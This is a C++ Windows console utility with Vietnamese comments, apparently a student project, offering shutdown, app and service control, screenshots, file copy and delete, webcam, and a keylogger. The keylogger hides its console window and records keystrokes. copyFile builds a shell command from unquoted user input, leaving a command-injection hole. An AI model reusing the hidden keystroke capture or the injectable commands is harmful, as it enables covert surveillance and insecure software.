// #define _WIN32_WINNT 0x0A00
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <shellscalingapi.h>
#include <tlhelp32.h>
#include <tchar.h>
// #include <TlHelp32.h>
#include <psapi.h>
#include <set>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

void shutdownComputer()
{
    system("shutdown /s /f /t 0");
}

void restartComputer()
{
    system("shutdown /r /f /t 0");
}

bool SpecialKeys(int S_Key, std::string &logData)
{
    switch (S_Key)
    {
    case VK_SPACE:
        logData += " ";
        return true;
    case VK_RETURN:
        logData += "\n";
        return true;
    case VK_SHIFT:
        logData += "[SHIFT]";
        return true;
    case VK_BACK:
        logData += "[BACKSPACE]";
        return true;
    case VK_RBUTTON:
        logData += "[R_CLICK]";
        return true;
    case VK_CAPITAL:
        logData += "[CAPS_LOCK]";
        return true;
    case VK_TAB:
        logData += "[TAB]";
        return true;
    case VK_UP:
        logData += "[UP_ARROW]";
        return true;
    case VK_DOWN:
        logData += "[DOWN_ARROW]";
        return true;
    case VK_LEFT:
        logData += "[LEFT_ARROW]";
        return true;
    case VK_RIGHT:
        logData += "[RIGHT_ARROW]";
        return true;
    case VK_CONTROL:
        logData += "[CONTROL]";
        return true;
    case VK_MENU:
        logData += "[ALT]";
        return true;
    // case VK_ESCAPE:
    //     logData += "[ESC]";
    //     return true;
    case VK_HOME:
        logData += "[HOME]";
        return true;
    case VK_END:
        logData += "[END]";
        return true;
    case VK_INSERT:
        logData += "[INSERT]";
        return true;
    case VK_DELETE:
        logData += "[DELETE]";
        return true;
    case VK_PRIOR:
        logData += "[PAGE_UP]";
        return true;
    case VK_NEXT:
        logData += "[PAGE_DOWN]";
        return true;
    case VK_F1:
        logData += "[F1]";
        return true;
    case VK_F2:
        logData += "[F2]";
        return true;
    case VK_F3:
        logData += "[F3]";
        return true;
    case VK_F4:
        logData += "[F4]";
        return true;
    case VK_F5:
        logData += "[F5]";
        return true;
    case VK_F6:
        logData += "[F6]";
        return true;
    case VK_F7:
        logData += "[F7]";
        return true;
    case VK_F8:
        logData += "[F8]";
        return true;
    case VK_F9:
        logData += "[F9]";
        return true;
    case VK_F10:
        logData += "[F10]";
        return true;
    case VK_F11:
        logData += "[F11]";
        return true;
    case VK_F12:
        logData += "[F12]";
        return true;
    case VK_LWIN:
        logData += "[LEFT_WIN]";
        return true;
    case VK_RWIN:
        logData += "[RIGHT_WIN]";
        return true;
    case VK_SNAPSHOT:
        logData += "[PRINT_SCREEN]";
        return true;
    case VK_SCROLL:
        logData += "[SCROLL_LOCK]";
        return true;
    case VK_PAUSE:
        logData += "[PAUSE]";
        return true;

    // Các phím đặc biệt
    case VK_OEM_4:
        logData += "[";
        return true;
    case VK_OEM_6:
        logData += "]";
        return true;
    case VK_OEM_1:
        logData += ";";
        return true;
    case VK_OEM_7:
        logData += "'";
        return true;
    case VK_OEM_COMMA:
        logData += ",";
        return true;
    case VK_OEM_PERIOD:
        logData += ".";
        return true;
    case VK_OEM_2:
        logData += "/";
        return true;
    case VK_OEM_5:
        logData += "\\";
        return true;
    case VK_OEM_MINUS:
        logData += "-";
        return true;
    case VK_OEM_PLUS:
        logData += "=";
        return true;

    // Các phím numpad
    case VK_NUMPAD0:
        logData += "0";
        return true;
    case VK_NUMPAD1:
        logData += "1";
        return true;
    case VK_NUMPAD2:
        logData += "2";
        return true;
    case VK_NUMPAD3:
        logData += "3";
        return true;
    case VK_NUMPAD4:
        logData += "4";
        return true;
    case VK_NUMPAD5:
        logData += "5";
        return true;
    case VK_NUMPAD6:
        logData += "6";
        return true;
    case VK_NUMPAD7:
        logData += "7";
        return true;
    case VK_NUMPAD8:
        logData += "8";
        return true;
    case VK_NUMPAD9:
        logData += "9";
        return true;
    case VK_ADD:
        logData += "+";
        return true;
    case VK_SUBTRACT:
        logData += "-";
        return true;
    case VK_MULTIPLY:
        logData += "*";
        return true;
    case VK_DIVIDE:
        logData += "/";
        return true;
    default:
        return false;
    }
}

string keyLogger()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    string logData = "";
    bool flag = 1;
    while (flag)
    {
        Sleep(10);
        for (int k = 8; k <= 256; k++)
        {
            if (GetAsyncKeyState(k) == -32767)
            {
                if (k == VK_ESCAPE)
                {
                    flag = 0;
                    break;
                }
                if (!SpecialKeys(k, logData))
                    logData += char(k);
            }
        }
    }
    return logData;
}

struct RunningApp
{
    DWORD processID;
    string windowTitle;
    string executableName;

    bool operator<(const RunningApp &other) const
    {
        return tie(processID, windowTitle) < tie(other.processID, other.windowTitle);
    }
};
bool isSystemApp(const string &windowTitle, const string &executableName)
{
    vector<string> excludedTitles = {"Settings", "Program Manager", "Windows Input Experience"};
    vector<string> excludedExecutables = {"SystemSettings.exe", "explorer.exe", "TextInputHost.exe", "ApplicationFrameHost.exe"};
    for (const string &title : excludedTitles)
    {
        if (windowTitle.find(title) != string::npos)
            return true;
    }
    for (const string &exe : excludedExecutables)
    {
        if (executableName.find(exe) != string::npos)
            return true;
    }

    return false;
}

string extractAppName(const string &path)
{
    size_t pos = path.find_last_of("\\/");
    if (pos != string::npos)
        return path.substr(pos + 1);
    return path;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    DWORD processID;
    GetWindowThreadProcessId(hwnd, &processID);

    if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0)
    {
        RunningApp app;
        app.processID = processID;

        int length = GetWindowTextLength(hwnd) + 1;
        vector<char> title(length);
        GetWindowTextA(hwnd, &title[0], length);
        app.windowTitle = &title[0];

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
        if (hProcess)
        {
            vector<char> exeName(MAX_PATH);
            if (GetModuleFileNameExA(hProcess, NULL, &exeName[0], MAX_PATH))
            {
                app.executableName = &exeName[0];
            }
            CloseHandle(hProcess);
        }

        if (!isSystemApp(app.windowTitle, app.executableName))
        {
            set<RunningApp> *apps = reinterpret_cast<set<RunningApp> *>(lParam);
            apps->insert(app);
        }
    }
    return TRUE;
}

void listApplications()
{
    set<RunningApp> runningApps;
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&runningApps));
    cout << "Cac ung dung dang chay:\n";
    for (const auto &app : runningApps)
    {
        cout << "Process ID: " << app.processID
             << "\nTieu de cua so: " << app.windowTitle
             << "\nTen executable: " << extractAppName(app.executableName)
             << "\nPath: " << app.executableName << "\n\n";
    }
}

bool getApplicationPathFromSearch(const string &appName, string &appPath)
{
    char result[MAX_PATH];

    // Tìm đường dẫn ứng dụng bằng tên thông qua Windows API
    HINSTANCE hFind = FindExecutable(appName.c_str(), NULL, result);
    if ((hFind != NULL) && (hFind > (HINSTANCE)32))
    {
        appPath = result;
        return true;
    }
    return false;
}

void startApplication(const string &appName)
{
    string appPath;

    // Tìm kiếm ứng dụng bằng tên
    if (getApplicationPathFromSearch(appName, appPath))
    {
        // Nếu tìm thấy đường dẫn ứng dụng
        string command = "start \"\" \"" + appPath + "\"";
        system(command.c_str());
        cout << "Starting application: " << appName << endl;
    }
    else
    {
        cout << "Application " << appName << " not found" << endl;
    }
}

string getFileName(const string &filePath)
{
    size_t pos = filePath.find_last_of("\\/");
    return (pos == string::npos) ? filePath : filePath.substr(pos + 1);
}

bool isApplicationRunning(const string &appName)
{
    string processName = getFileName(appName);
    bool isRunning = false;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe))
        {
            do
            {
                if (processName == pe.szExeFile)
                {
                    isRunning = true;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return isRunning;
}

void stopApplication(const string &appPath)
{
    string processName = getFileName(appPath);
    if (isApplicationRunning(processName))
    {
        string command = "taskkill /IM " + processName + " /F";
        system(command.c_str());
        cout << "Stopping application: " << appPath << "\n";
    }
    else
    {
        cout << "Application is not running: " << appPath << "\n";
    }
}

void listServices()
{
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scmHandle == NULL)
    {
        std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
        return;
    }

    DWORD bytesNeeded = 0;
    DWORD servicesCount = 0;
    DWORD resumeHandle = 0;

    // Lần đầu gọi EnumServicesStatus để lấy số byte cần thiết
    if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesCount, &resumeHandle))
    {
        DWORD error = GetLastError();
        if (error != ERROR_MORE_DATA) // Chỉ xử lý khi gặp lỗi khác
        {
            std::cerr << "Error calling EnumServicesStatus for size calculation: " << error << std::endl;
            CloseServiceHandle(scmHandle);
            return;
        }
    }

    // Cấp phát bộ nhớ ban đầu
    LPENUM_SERVICE_STATUS services = NULL;
    services = (LPENUM_SERVICE_STATUS)LocalAlloc(LMEM_ZEROINIT, bytesNeeded);
    if (services == NULL)
    {
        std::cerr << "Error allocating memory" << std::endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    // Lần gọi EnumServicesStatus để liệt kê các dịch vụ
    if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle))
    {
        DWORD error = GetLastError();
        if (error == ERROR_MORE_DATA)
        {
            // Nếu thiếu bộ nhớ, cấp phát lại mà không in thông báo
            services = (LPENUM_SERVICE_STATUS)LocalReAlloc(services, bytesNeeded, LMEM_ZEROINIT);
            if (services == NULL)
            {
                std::cerr << "Error reallocating memory" << std::endl;
                CloseServiceHandle(scmHandle);
                return;
            }

            // Gọi lại EnumServicesStatus
            if (!EnumServicesStatus(scmHandle, SERVICE_TYPE_ALL, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle))
            {
                std::cerr << "Error enumerating services after reallocating memory: " << GetLastError() << std::endl;
                LocalFree(services);
                CloseServiceHandle(scmHandle);
                return;
            }
        }
        else
        {
            std::cerr << "Error enumerating services: " << error << std::endl;
            LocalFree(services);
            CloseServiceHandle(scmHandle);
            return;
        }
    }

    // Hiển thị tên của các dịch vụ
    for (DWORD i = 0; i < servicesCount; i++)
    {
        std::wcout << services[i].lpServiceName << std::endl;
    }

    // Giải phóng bộ nhớ và đóng handle của SCM
    LocalFree(services);
    CloseServiceHandle(scmHandle);
}

void startService(const std::string &serviceName)
{
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scmHandle == NULL)
    {
        std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
        return;
    }

    // Chuyển std::string sang LPSTR (mảng char) cho API Windows
    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName.c_str(), SERVICE_START);
    if (serviceHandle == NULL)
    {
        std::cerr << "Error opening service: " << GetLastError() << std::endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    // Bắt đầu dịch vụ
    if (!StartService(serviceHandle, 0, NULL))
    {
        std::cerr << "Error starting service: " << GetLastError() << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return;
    }

    std::cout << "Service " << serviceName << " started successfully!" << std::endl;

    // Đóng handle
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void stopService(const std::string &serviceName)
{
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scmHandle == NULL)
    {
        std::cerr << "Error opening Service Control Manager: " << GetLastError() << std::endl;
        return;
    }

    SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName.c_str(), SERVICE_STOP);
    if (serviceHandle == NULL)
    {
        DWORD dwError = GetLastError();
        std::cerr << "Error opening service: " << dwError << std::endl;
        if (dwError == ERROR_ACCESS_DENIED)
        {
            std::cerr << "Access Denied. Try running the program as Administrator." << std::endl;
        }
        CloseServiceHandle(scmHandle);
        return;
    }

    SERVICE_STATUS status;
    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status))
    {
        DWORD dwError = GetLastError();
        std::cerr << "Error stopping service: " << dwError << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return;
    }

    std::cout << "Service " << serviceName << " stopped successfully!" << std::endl;

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

bool CaptureScreen(const std::string &filename)
{
    // Lấy kích thước màn hình
    UINT dpi = 96;
    HMONITOR hMonitor = MonitorFromWindow(nullptr, MONITOR_DEFAULTTOPRIMARY);
    if (hMonitor)
        GetDpiForMonitor(hMonitor, MDT_EFFECTIVE_DPI, &dpi, &dpi);

    int screenWidth = GetSystemMetricsForDpi(SM_CXSCREEN, dpi);
    int screenHeight = GetSystemMetricsForDpi(SM_CYSCREEN, dpi);

    // Tạo một DC để tương tác với màn hình
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    if (!hMemoryDC)
    {
        std::cerr << "Không thể tạo DC tương thích!" << std::endl;
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Cấu hình cho bitmap với BITMAPINFO
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight; // Đặt chiều cao âm để lưu ảnh đúng chiều
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    // Tạo một DIB section
    void *pBits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hScreenDC, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);

    if (!hBitmap)
    {
        std::cerr << "Không thể tạo DIB section!" << std::endl;
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Chọn bitmap vào DC bộ nhớ
    SelectObject(hMemoryDC, hBitmap);

    // Sao chép dữ liệu từ màn hình vào bitmap
    if (!BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY))
    {
        std::cerr << "Không thể sao chép dữ liệu từ màn hình vào bitmap!" << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Tạo file để lưu bitmap
    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER &bi = bmi.bmiHeader;
    DWORD dwBmpSize = ((screenWidth * bi.biBitCount + 31) / 32) * 4 * screenHeight;
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;

    fileHeader.bfType = 0x4D42; // "BM"
    fileHeader.bfSize = dwFileSize;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    std::ofstream file(filename, std::ios::out | std::ios::binary);
    if (!file)
    {
        std::cerr << "Không thể tạo file ảnh!" << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }

    // Ghi dữ liệu vào file
    file.write(reinterpret_cast<const char *>(&fileHeader), sizeof(fileHeader));
    file.write(reinterpret_cast<const char *>(&bi), sizeof(bi));
    file.write(reinterpret_cast<const char *>(pBits), dwBmpSize);
    file.close();

    // Giải phóng tài nguyên
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    std::cout << "Chụp màn hình thành công! File lưu tại: " << filename << std::endl;
    return true;
}

void takeScreenShot()
{
    SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
    std::string filename = "C:\\Users\\LENOVO\\oop\\screenshot.png";
    if (!CaptureScreen(filename))
    {
        std::cerr << "Chụp màn hình thất bại!" << std::endl;
        return;
    }
}

void copyFile(const string &fileSrc, const string &fileDes)
{
    string command = "copy " + fileSrc + " " + fileDes;
    system(command.c_str());
}

void deleteFile(const string &fileName)
{
    string command = "del \"" + fileName + "\"";
    system(command.c_str());
}

void startWebcam()
{
    system("start microsoft.windows.camera:");
}
void stopWebcam()
{
    system("taskkill /F /IM WindowsCamera.exe");
}

int main()
{
    int choice;
    cout << "Select 1 option: " << endl;
    cout << "\t1. Shutdown" << endl;
    cout << "\t2. Reset" << endl;
    cout << "\t3. Keylogger" << endl;
    cout << "\t4. List of applications" << endl;
    cout << "\t5. Start application" << endl;
    cout << "\t6. Stop application" << endl;
    cout << "\t7. List of services" << endl;
    cout << "\t8. Start service" << endl;
    cout << "\t9. Stop service" << endl;
    cout << "\t10. Screenshot" << endl;
    cout << "\t11. Copy file" << endl;
    cout << "\t12. Delete file" << endl;
    cout << "\t13. Start webcam" << endl;
    cout << "\t14. Stop webcam" << endl;
    cout << "\t0. Exit program" << endl;
    cout << "Enter selection: ";
    cin >> choice;
    string appName, serviceName, fileName, srcFile, desFile;
    string logData;
    switch (choice)
    {
    case 1:
        cout << "Shutting down the computer..." << endl;
        shutdownComputer();
        break;
    case 2:
        cout << "Restarting the computer..." << endl;
        restartComputer();
        break;
    case 3:
        logData = keyLogger();
        cout << logData;
        break;
    case 4:
        cout << "List of applications:\n";
        listApplications();
        break;
    case 5:
        cout << "Enter the name of the application to open: ";
        cin >> appName;
        startApplication(appName);
        break;
    case 6:
        cout << "Enter the name of the application to stop: ";
        cin >> appName;
        stopApplication(appName);
        break;
    case 7:
        listServices();
        break;
    case 8:
        cout << "Enter the name of the service to open: ";
        cin >> serviceName;
        startService(serviceName);
        break;
    case 9:
        cout << "Enter the name of the service to stop: ";
        cin >> serviceName;
        stopService(serviceName);
        break;
    case 10:
        takeScreenShot();
        break;
    case 11:
        cout << "Enter source file name: ";
        cin >> srcFile;
        cout << "Enter destination file name: ";
        cin >> desFile;
        copyFile(srcFile, desFile);
        break;
    case 12:
        cout << "Enter file name to delete: ";
        cin >> fileName;
        deleteFile(fileName);
        break;
    case 13:
        startWebcam();
        break;
    case 14:
        stopWebcam();
        break;
    case 0:
        cout << "Exit the program" << endl;
        return 0;
    default:
        cout << "Invalid selection!" << endl;
        break;
    }
    return 0;
}
